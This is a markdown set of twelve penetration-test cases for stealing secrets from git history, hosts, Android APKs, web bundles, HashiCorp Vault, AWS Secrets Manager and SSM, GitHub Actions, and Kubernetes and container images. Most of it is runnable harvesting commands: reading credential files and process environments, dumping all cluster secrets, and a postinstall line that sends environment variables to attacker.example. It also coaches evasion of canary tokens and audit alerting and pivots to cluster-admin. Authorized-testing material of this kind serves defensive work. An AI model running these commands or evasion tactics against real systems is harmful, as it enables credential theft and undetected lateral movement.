# Secret Management Attack Test Cases

> Companion to `SKILL.md`, containing structured test cases TC-SM-001 through TC-SM-012 covering repository history sweep, filesystem scan, SAST custom rules, mobile APK extraction, web crawl, HashiCorp Vault exploitation, cloud secret manager abuse, CI/CD pipeline secret theft, Kubernetes secret dump, container image layer analysis, secret verification workflow, and full lifecycle audit.
>
> All commands assume lawful authorization, signed scope-of-work, and explicit per-test client approval before any live API verification. Verification of credentials against provider endpoints is an OPSEC event.

---

## Statistics

| Category | Count | Severity Range |
|------|------|-----------|
| A. Discovery & Scanning | 4 | MEDIUM - CRITICAL |
| B. Secrets-Management Platform | 3 | HIGH - CRITICAL |
| C. CI/CD & Container | 3 | HIGH - CRITICAL |
| D. Verification & OPSEC | 2 | MEDIUM - HIGH |
| **Total** | **12** | **MEDIUM - CRITICAL** |

---

## A. Discovery & Scanning

### TC-SM-001: Repository History Secret Sweep (Local-Only OPSEC)

| Field | Value |
|------|-----|
| **ID** | TC-SM-001 |
| **Name** | Repository History Secret Sweep (Local-Only) |
| **Objective** | Discover every secret embedded in a repository's full git history (all branches, tags, dangling commits) without triggering provider-side secret-scanning alerts. Validates coverage of "deleted" secrets that remain in pack files. |
| **Tools** | gitleaks, trufflehog, git |
| **Steps** | 1. Mirror-clone the target repo locally: `git clone --mirror <repo_url> repo-bare` (mirror clone preserves all refs including dangling commits)<br>2. Run gitleaks against all refs: `cd repo-bare && gitleaks detect --source . --report-path gitleaks.json --log-opts=" --all" --redact`<br>3. Run trufflehog without verification (OPSEC-safe): `trufflehog git file://repo-bare --no-verification --no-update --json > trufflehog_unverified.jsonl`<br>4. Dedupe findings across both scanners by secret value hash<br>5. Manual review of unique candidates; classify by apparent provider (AWS, GitHub, Vault, etc.) and review the surrounding commit context |
| **Expected Result** | JSON/SARIF report enumerating each unique secret candidate with file, commit SHA, line number, rule matched, and redacted secret preview. No outbound API calls made. |
| **Cleanup** | `rm -rf repo-bare gitleaks.json trufflehog_unverified.jsonl` (or move to encrypted vault per engagement retention policy) |
| **References** | SKILL.md §Practical Steps Exercise 1; payloads.md §1.2, §2.2, §16.1 |

### TC-SM-002: Filesystem Hardcoded-Credential Sweep

| Field | Value |
|------|-----|
| **ID** | TC-SM-002 |
| **Name** | Filesystem Hardcoded-Credential Sweep |
| **Objective** | From a foothold on a compromised host, enumerate plaintext credentials in common locations: `.env`, `~/.aws/credentials`, `~/.kube/config`, `~/.docker/config.json`, `~/.npmrc`, `~/.pypirc`, `~/.netrc`, IDE workspace state, shell history, and log files. |
| **Tools** | gitleaks (--no-git), trufflehog filesystem, grep |
| **Steps** | 1. Inventory target directories: `for d in /home /etc /opt /var/log /root /srv /usr/local; do ls -la $d; done`<br>2. Run gitleaks without git: `gitleaks detect --source /target --no-git --report-path fs_leaks.json`<br>3. Run trufflehog filesystem: `trufflehog filesystem /target --json > fs_th.jsonl`<br>4. Manual grep for known credential file paths: `find /target -name "*.env" -o -name "credentials" -o -name ".npmrc" -o -name ".netrc" -o -name "kubeconfig" 2>/dev/null`<br>5. Extract and decode any base64-encoded blobs in config files<br>6. Check process environments for in-memory secrets: `for pid in $(pgrep -f service); do cat /proc/$pid/environ | tr '\0' '\n'; done` |
| **Expected Result** | Catalog of every plaintext credential on the host with file path, line, redacted value, and owner. |
| **Cleanup** | `shred -u fs_leaks.json fs_th.jsonl` after extracting masked findings into report. Never write raw secrets to long-term storage. |
| **References** | SKILL.md §Practical Steps Exercise 1; payloads.md §1.3, §2.4 |

### TC-SM-003: SAST Custom-Rule Proprietary Secret Audit

| Field | Value |
|------|-----|
| **ID** | TC-SM-003 |
| **Name** | SAST Custom-Rule Proprietary Secret Audit |
| **Objective** | Author custom semgrep + bearer rules that match the client's proprietary token formats (internal API keys, bespoke auth schemes, custom JWT signatures) that off-the-shelf scanners miss. |
| **Tools** | semgrep, bearer, jq |
| **Steps** | 1. Gather 10-20 sample proprietary secrets from the client (sample only — never production values)<br>2. Identify the canonical format (prefix, length, charset, entropy)<br>3. Write a semgrep rule in `custom_secrets.yml` (see SKILL.md §Practical Steps Exercise 2 for template)<br>4. Add allowlist patterns for example/test/placeholder values<br>5. Run scan: `semgrep --config custom_secrets.yml . --json -o findings.json`<br>6. Tune false-positive rate: aim for >90% precision on a labeled validation set<br>7. Add dataflow rule to detect secret-to-sink flow (e.g., `secret → console.log`)<br>8. Add bearer custom rule for the same pattern as cross-check |
| **Expected Result** | Tuned ruleset finding 90%+ of planted proprietary secrets with <10% false-positive rate in validation set. Dataflow rules surface insecure handling paths. |
| **Cleanup** | Remove sample secrets from validation environment. Do NOT commit the ruleset with sample values to a public repo. |
| **References** | SKILL.md §Practical Steps Exercise 2; payloads.md §3.3, §3.4, §4.3 |

### TC-SM-004: Mobile APK Secret Extraction

| Field | Value |
|------|-----|
| **ID** | TC-SM-004 |
| **Name** | Mobile APK Secret Extraction |
| **Objective** | Extract every embedded secret from a production Android APK: API keys, Firebase config, OAuth client secrets, hardcoded backend URLs, and BuildConfig values. |
| **Tools** | apkleaks, trufflehog filesystem, jadx, apktool |
| **Steps** | 1. Obtain the APK (Play Store pull via `apk-mitm`, vendor-provided, or extracted from device)<br>2. Run apkleaks: `apkleaks -f app.apk -o apkleaks.json`<br>3. Extract DEX: `unzip -p app.apk classes.dex > classes.dex`<br>4. Run trufflehog on extracted DEX: `trufflehog filesystem --json . > apk_th.jsonl`<br>5. Decompile with jadx: `jadx -d app_src app.apk`<br>6. Grep for hardcoded values: `grep -rE "BuildConfig\.(API_KEY|SECRET)|google_api_key|firebase_url" app_src/`<br>7. Check for leaked `google-services.json` / Firebase config: `unzip -p app.apk assets/google-services.xml`<br>8. Probe any Firebase URLs for open rules: `curl https://<project>.firebaseio.com/.json` |
| **Expected Result** | Catalog of all secrets embedded in the APK with file/class location, type, and verification status. |
| **Cleanup** | `rm -rf app_src app.apk.extracted classes.dex apkleaks.json apk_th.jsonl` |
| **References** | SKILL.md §Practical Steps Exercise 8; payloads.md §5 |

---

## B. Secrets-Management Platform

### TC-SM-005: Web App JavaScript Secret Crawl

| Field | Value |
|------|-----|
| **ID** | TC-SM-005 |
| **Name** | Web App JavaScript Secret Crawl |
| **Objective** | Crawl a target web application, extract inline secrets from JavaScript bundles, sourcemaps, and HTML comments, and identify forgotten debug endpoints leaking tokens. |
| **Tools** | cariddi, katana, curl, jq, grep |
| **Steps** | 1. Crawl with cariddi: `cariddi -u https://app.target.com -e -s -d 3 -timeout 10 -json -o cariddi.json`<br>2. Alternative crawl with katana for JS coverage: `katana -u https://app.target.com -jc -d 3 \| grep "\.js$" > js_urls.txt`<br>3. Download each JS bundle: `for url in $(cat js_urls.txt); do curl -s "$url" >> bundle.js; done`<br>4. Extract secrets with regex: `grep -oE "(AKIA[0-9A-Z]{16}\|sk_live_[A-Za-z0-9]{24,}\|ghp_[A-Za-z0-9]{36}\|AIza[0-9A-Za-z_\-]{35}\|xox[bao]-[A-Za-z0-9-]+)" bundle.js \| sort -u`<br>5. Check for sourcemaps exposing original source paths: `curl -s https://app.target.com/bundle.js.map \| jq .sources`<br>6. Look for hidden debug endpoints in JS: `grep -oE "/(debug\|admin\|internal\|test)/[a-z]+" bundle.js \| sort -u`<br>7. Verify each candidate (with OPSEC awareness — see TC-SM-011) |
| **Expected Result** | List of all secrets extracted from client-side JS, with source bundle URL, line, and verification status. |
| **Cleanup** | `rm -f bundle.js cariddi.json js_urls.txt` |
| **References** | SKILL.md §Practical Steps Exercise 9; payloads.md §6 |

### TC-SM-006: HashiCorp Vault Token Capabilities Abuse

| Field | Value |
|------|-----|
| **ID** | TC-SM-006 |
| **Name** | HashiCorp Vault Token Capabilities Abuse |
| **Objective** | From a foothold on a host with a Vault agent sidecar token, enumerate every secret path the token can read without revoking the token (OPSEC preservation). Demonstrate blast radius. |
| **Tools** | HashiCorp Vault CLI, jq, find |
| **Steps** | 1. Discover the token: check `~/.vault-token`, `env \| grep VAULT`, `/etc/vault.d/*`, process environments via `/proc/<pid>/environ`<br>2. Token introspection: `vault token lookup`<br>3. Enumerate policies: `vault token lookup -format=json \| jq .data.policies`<br>4. Capabilities check across common paths: `for p in secret/ secret/data/ kv/ prod/ staging/ pki/ database/ aws/; do vault token capabilities $p; done`<br>5. Recursive secret walker (see payloads.md §9.3): harvest every secret at every reachable path<br>6. Pivot-graph: for each harvested secret (RDS password, AWS key), enumerate downstream access<br>7. OPSEC: do NOT revoke the token; do NOT make bulk reads in a tight window (spread over time) |
| **Expected Result** | Complete blast-radius map: token → policies → reachable paths → each secret's downstream access. No token revocation, no audit anomalies. |
| **Cleanup** | `shred -u vault_harvest.json`. Coordinate with client on token rotation AFTER engagement ends. |
| **References** | SKILL.md §Practical Steps Exercise 3; payloads.md §9 |

### TC-SM-007: AWS Secrets Manager Blast-Radius Enumeration

| Field | Value |
|------|-----|
| **ID** | TC-SM-007 |
| **Name** | AWS Secrets Manager Blast-Radius Enumeration |
| **Objective** | From a verified AWS access key (TC-SM-011), enumerate and read every secret in AWS Secrets Manager and SSM Parameter Store the key can access. Quantify blast radius. |
| **Tools** | aws-cli, jq |
| **Steps** | 1. Lightest-touch identity check: `aws sts get-caller-identity` (this is logged in CloudTrail but does not modify state)<br>2. Enumerate regions: `for region in us-east-1 us-west-2 eu-west-1 ap-southeast-2; do aws secretsmanager list-secrets --region $region --output json > secrets_${region}.json; done`<br>3. Read each secret (CloudTrail data event — OPSEC-sensitive): `for arn in $(jq -r '.SecretList[].ARN' secrets_us-east-1.json); do aws secretsmanager get-secret-value --secret-id "$arn" --region us-east-1 --query 'SecretString' --output text >> harvested.jsonl; done`<br>4. SSM Parameter Store enumeration: `aws ssm describe-parameters --output json > ssm.json`<br>5. Decrypt SecureString parameters: `for n in $(jq -r '.Parameters[].Name' ssm.json); do aws ssm get-parameter --name "$n" --with-decryption --query 'Parameter.Value' --output text; done`<br>6. Pivot-graph: for each harvested DB credential, attempt RDS auth; for each AWS key, run STS GetCallerIdentity<br>7. Quantify blast radius: count of secrets × downstream services reachable |
| **Expected Result** | Catalog of every readable secret with ARN, region, value, type, and downstream pivot potential. CloudTrail events logged (expected). |
| **Cleanup** | `shred -u harvested.jsonl secrets_*.json ssm.json`. Document every CloudTrail event for the post-engagement report. |
| **References** | SKILL.md §Practical Steps Exercise 4; payloads.md §8.3, §10.3 |

---

## C. CI/CD & Container

### TC-SM-008: CI/CD Pipeline Secret Theft (GitHub Actions)

| Field | Value |
|------|-----|
| **ID** | TC-SM-008 |
| **Name** | CI/CD Pipeline Secret Theft via `pull_request_target` |
| **Objective** | Demonstrate how a misconfigured GitHub Actions workflow using `pull_request_target` with `secrets.*` exposes repository secrets to attackers who open a fork-PR. Reference real CVEs: `tj-actions/changed-files` (2025), Codecov supply chain (2021). |
| **Tools** | gh (GitHub CLI), git, GitHub Actions |
| **Steps** | 1. Review target workflow YAML for `on: pull_request_target` with `secrets.*` usage<br>2. Identify the specific pattern: `with: ref: ${{ github.event.pull_request.head.sha }}` + downstream `secrets.X`<br>3. Demonstrate in a sandbox fork: create a fork, modify `package.json` to exfil env vars in postinstall: `"scripts": {"postinstall": "curl -d @- https://attacker.example/ < /proc/self/environ \|\| true"}`<br>4. Open a PR; observe workflow execution exfiltrating `PROD_DEPLOY_KEY`<br>5. Document the proof-of-concept in the report<br>6. Provide remediation: never use `pull_request_target` with secrets; use `pull_request` instead, OR add a label-gate job that re-checks-out the base branch |
| **Expected Result** | PoC demonstrating that a fork-PR can read repository secrets via `pull_request_target`. Workflow YAML, attack PR diff, and remediation guidance. |
| **Cleanup** | Close the PoC PR; rotate any exfiltrated sandbox secrets; confirm workflow remediation. |
| **References** | SKILL.md §Practical Steps Exercise 5; payloads.md §11.1, §11.7 |

### TC-SM-009: Kubernetes Secret Dump Across Namespaces

| Field | Value |
|------|-----|
| **ID** | TC-SM-009 |
| **Name** | Kubernetes Secret Dump Across Namespaces |
| **Objective** | From a foothold with a compromised Service Account token, enumerate and dump every secret in every namespace the SA can reach. Pivot to cluster-admin if RBAC allows via CSR creation. |
| **Tools** | kubectl, jq, etcdctl, peirates |
| **Steps** | 1. Identify SA capabilities: `kubectl auth can-i --list`<br>2. Check critical capabilities: `kubectl auth can-i get secrets -A; kubectl auth can-i get secrets -n kube-system; kubectl auth can-i create csr`<br>3. Dump all secrets: `kubectl get secrets -A -o json \| jq '.items[] \| {ns: .metadata.namespace, name: .metadata.name, type: .type, data: (.data \| to_entries \| map({key: .key, value: (.value \| @base64d)}))}'`<br>4. Extract ImagePullSecrets for private registry creds: `kubectl get secrets -A -o json \| jq '.items[] \| select(.type=="kubernetes.io/dockerconfigjson") \| {auths: (.data[".dockerconfigjson"] \| @base64d \| fromjson).auths}'`<br>5. Extract Service Account JWTs: `kubectl get secrets -A -o json \| jq '.items[] \| select(.type=="kubernetes.io/service-account-token") \| .data.token' \| tr -d '"' \| base64 -d`<br>6. If RBAC allows CSR: pivot to cluster-admin via TLS bootstrap (payloads.md §12.6)<br>7. If you can reach etcd directly: snapshot extraction via `etcdctl snapshot save` (payloads.md §12.5) |
| **Expected Result** | Complete secret catalog across all accessible namespaces, decoded values, imagePullSecrets, SA JWTs, and (if applicable) cluster-admin pivot proof. |
| **Cleanup** | `shred -u secrets_dump.json sa_tokens.txt`. Coordinate cluster rotation after engagement. |
| **References** | SKILL.md §Practical Steps Exercise 6; payloads.md §12 |

### TC-SM-010: Container Image Layer Analysis

| Field | Value |
|------|-----|
| **ID** | TC-SM-010 |
| **Name** | Container Image Layer Analysis for Hidden Secrets |
| **Objective** | Walk every layer of a Docker image to find secrets baked into base or intermediate layers even when "deleted" in later layers. Use dive + trivy + manual tar extraction. |
| **Tools** | dive, trivy, grype, docker, tar, grep |
| **Steps** | 1. Pull the image: `docker pull <image_ref>`<br>2. Interactive layer walk: `dive <image_ref>` — inspect each layer's added/modified files<br>3. Automated secret scan: `trivy image --scanners secret --format json <image_ref> -o trivy.json`<br>4. Manual: save image to tar: `docker save <image_ref> -o image.tar && mkdir image && tar xf image.tar -C image`<br>5. For each layer: `for layer in image/*/layer.tar; do echo "=== $layer ==="; tar tvf "$layer" \| grep -E '(\.env\|credentials\|\.key\|\.pem\|config\.json\|\.npmrc\|\.pypirc\|\.netrc\|\.kube/config)'; done`<br>6. Extract interesting files from specific layers: `tar xvf image/<hash>/layer.tar etc/.env`<br>7. Cross-reference with syft/grype SBOM to confirm provenance<br>8. Document findings with layer hash, file path, secret type, and which "delete" layer tried to remove it |
| **Expected Result** | Catalog of every secret embedded in any layer, with layer hash and the (failed) delete attempt location. |
| **Cleanup** | `rm -rf image image.tar trivy.json`. |
| **References** | SKILL.md §Practical Steps Exercise 7; payloads.md §13 |

---

## D. Verification & OPSEC

### TC-SM-011: Secret Verification Workflow with Canary-Token Evasion

| Field | Value |
|------|-----|
| **ID** | TC-SM-011 |
| **Name** | Secret Verification Workflow with Canary-Token Evasion |
| **Objective** | Establish a safe verification workflow that distinguishes real secrets from canary tokens / honeytokens before any live API call. Prevent triggering defender alerting from thinkst, GitGuardian, or custom AWS honey keys. |
| **Tools** | trufflehog (--only-verified), curl, custom heuristics |
| **Steps** | 1. Heuristic pre-check on every candidate: context grep for `(canary\|honey\|example\|test\|token\|decoy)` in surrounding lines<br>2. Format validation: regex match against known provider formats (payloads.md §15.1)<br>3. Local entropy check: Shannon entropy > 4.5 on base64-ish string<br>4. Local context check: file type (README vs production code), commit age (older = more likely real but possibly rotated), committer (internal vs external)<br>5. AWS honey-key account check: known honeypot account IDs (123456789012, 111111111111, etc.)<br>6. thinkst domain check: `grep -rE "canarytokens\.(com\|org)"`<br>7. ONLY after heuristics pass: trufflehog `--only-verified` or manual lightest-touch call (STS GetCallerIdentity for AWS, `GET /user` for GitHub PAT)<br>8. Document verification as an OPSEC event with timestamp, IP used, provider response code |
| **Expected Result** | Verified-secrets list with documented heuristics applied and OPSEC events logged. Zero unintended honeytoken triggers. |
| **Cleanup** | Record all verification events for client audit trail. Recommend rotation of all verified secrets regardless. |
| **References** | SKILL.md §Methodology Phase 3; payloads.md §14, §16 |

### TC-SM-012: Full Lifecycle Audit and Blast-Radius Report

| Field | Value |
|------|-----|
| **ID** | TC-SM-012 |
| **Name** | Full Lifecycle Audit and Blast-Radius Report Assembly |
| **Objective** | Execute the complete six-phase methodology end-to-end: scope → breadth scan → triage/verify → platform exploit → lateral pivot → report. Produce a deliverable mapping every verified secret to its blast radius and rotation status. |
| **Tools** | gitleaks, trufflehog, semgrep, bearer, apkleaks, cariddi, dive, trivy, vault CLI, aws-cli, kubectl, jq |
| **Steps** | 1. Phase 1 — Scope & Inventory: define targets (repos, hosts, images, APKs, web apps, cloud, vault, CI, K8s); set OPSEC limits (no live verification without approval, max verification budget per day)<br>2. Phase 2 — Breadth Scan: run gitleaks + trufflehog (unverified) + semgrep + bearer + apkleaks + cariddi + dive + trivy against every applicable target<br>3. Phase 3 — Triage & Verify: dedupe, filter false positives, rank by blast radius, apply canary-token heuristics, verify ONLY high-confidence candidates with explicit approval<br>4. Phase 4 — Platform Exploit: for each verified secret, expand to its native platform (Vault enumeration, AWS Secrets Manager dump, K8s secret dump, CI variable extraction)<br>5. Phase 5 — Lateral Pivot: maintain a pivot graph; each harvested secret expands reachable nodes; record every pivot<br>6. Phase 6 — Report: blast-radius graph (mermaid diagram), rotation-status table, severity classification, recommendations |
| **Expected Result** | Comprehensive deliverable: findings table with masked secrets, blast-radius graph, rotation status (rotated / pending / refused), severity distribution, and prioritized remediation recommendations. |
| **Cleanup** | `shred -u` all working files; encrypt final deliverable at rest; coordinate post-engagement rotation ceremony with client. |
| **References** | SKILL.md §Methodology; payloads.md §17 |

---

## Severity Calibration

| Severity | Criteria | Example |
|----------|----------|---------|
| **CRITICAL** | Verified live production secret with broad blast radius (Vault token to `secret/*`, AWS root-equivalent key, CI deploy token) | Verified Vault root token read across 200 secrets |
| **HIGH** | Verified live secret with limited blast radius, or unverified secret in production-critical code path | Verified Stripe test key; unverified prod AWS key in /etc |
| **MEDIUM** | Secret in non-production context (dev env, README example that looks real), or expired/rotated-but-unremoved secret | Old AWS key in 3-year-old commit (likely rotated) |
| **LOW** | Test/example/placeholder value that matches a secret regex but is clearly not real | `AKIAEXAMPLEEXAMPLE` in documentation |
| **INFO** | Insecure pattern (e.g., secret-handling code path) without an actual leaked secret | Code that logs `process.env.SECRET` to stdout |

---

## OPSEC Quick Reference

| Action | OPSEC Risk | Mitigation |
|--------|-----------|------------|
| Remote scan via trufflehog github | HIGH — GitHub Secret Scanning may alert | Mirror-clone, local scan |
| `--only-verified` on AWS keys | HIGH — CloudTrail event + GuardDuty anomaly | Manual lightest-touch (STS GetCallerIdentity) only after explicit approval |
| Bulk Vault reads | MEDIUM — audit device anomaly | Spread reads over time |
| HashiCorp Vault token revocation | HIGH — immediately alerts Vault admin | NEVER revoke during engagement |
| AWS Secrets Manager bulk get | MEDIUM — CloudTrail data event spike | Cap concurrency, distribute over time |
| Reading K8s secrets with `kubectl get` | LOW — audit logged but normal pattern | Use existing SA token, do not create new SAs |
| Image registry API probing | LOW — registry access logs | Use existing creds; avoid anonymous pulls from unusual IPs |

---

## Cross-References

- **`SKILL.md`** — methodology, six-phase process, defense perspective
- **`payloads.md`** — every command catalogued by section
- **`guides/secret-management-attack-playbook.md`** — end-to-end workflow walkthrough
- **`skills/security-review/SKILL.md`** — broader checklist this skill extends
- **`skills/repo-scan/SKILL.md`** — codebase classification input
- **`skills/cloud-security/SKILL.md`** — IAM context for cloud secret findings
- **`skills/post-exploitation/SKILL.md`** — host takeover after credential-driven access
